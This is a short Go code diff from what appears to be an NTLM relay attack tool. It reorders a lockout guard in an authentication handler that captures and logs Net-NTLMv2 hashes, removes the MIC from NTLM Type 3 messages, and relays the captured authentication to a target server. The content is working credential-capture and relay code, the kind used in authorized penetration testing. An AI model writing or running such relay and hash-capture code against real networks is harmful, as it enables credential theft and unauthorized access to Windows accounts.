@@ -354,9 +354,26 @@ func handleAuth(auth AuthResult, cfg *Config) {
 		return
 	}
 
-	// Extract and log Net-NTLMv2 hash (before any manipulation, and before relay attempt
-	// so the hash is captured even if relay fails — matches Impacket behavior)
+	// Relay Type 3 to target
 	domain, user := extractNTLMType3Info(type3)
+	identity := fmt.Sprintf("%s\\%s", domain, user)
+
+	// Lockout guard: once this identity failed a relay/attack this run, do not
+	// push another Type 3 into any target (each attempt is one failed logon for
+	// the account). Default stops the identity globally; -try-all-targets lets
+	// it try each remaining target once (only the exact tried pair is skipped).
+	// Declined sessions return here, before any hash logging, so a stopped
+	// identity's re-polls stay silent instead of re-printing Type 3/hash lines.
+	if cfg.WasRelayTried(target.URL(), identity) ||
+		(!cfg.TryAllTargets && cfg.HasRelayFailed(identity)) {
+		verboseLog("[-] Skipping relay for %s → %s: identity already failed this run (lockout guard)", identity, target.URL())
+		auth.ResultCh <- false
+		return
+	}
+
+	// Capture and log the Net-NTLMv2 hash (before manipulation, and before the
+	// relay attempt so the hash is kept even if this relay fails — matches
+	// Impacket behavior).
 	if hash := extractNetNTLMv2Hash(origType2, type3, domain, user); hash != "" {
 		logCapturedHash(hash, cfg.OutputFile)
 	}
@@ -364,20 +381,6 @@ func handleAuth(auth AuthResult, cfg *Config) {
 	// Apply NTLM manipulation to Type 3
 	if cfg.RemoveMIC {
 		type3 = removeMIC(type3)
-	}
-
-	// Relay Type 3 to target
-	identity := fmt.Sprintf("%s\\%s", domain, user)
-
-	// Lockout guard: once this identity failed a relay/attack this run, do not
-	// push another Type 3 into any target (each attempt is one failed logon for
-	// the account). Default stops the identity globally; -try-all-targets lets
-	// it try each remaining target once (only the exact tried pair is skipped).
-	if cfg.WasRelayTried(target.URL(), identity) ||
-		(!cfg.TryAllTargets && cfg.HasRelayFailed(identity)) {
-		verboseLog("[-] Skipping relay for %s → %s: identity already failed this run (lockout guard)", identity, target.URL())
-		auth.ResultCh <- false
-		return
 	}
 
 	if err := client.SendAuth(type3); err != nil {
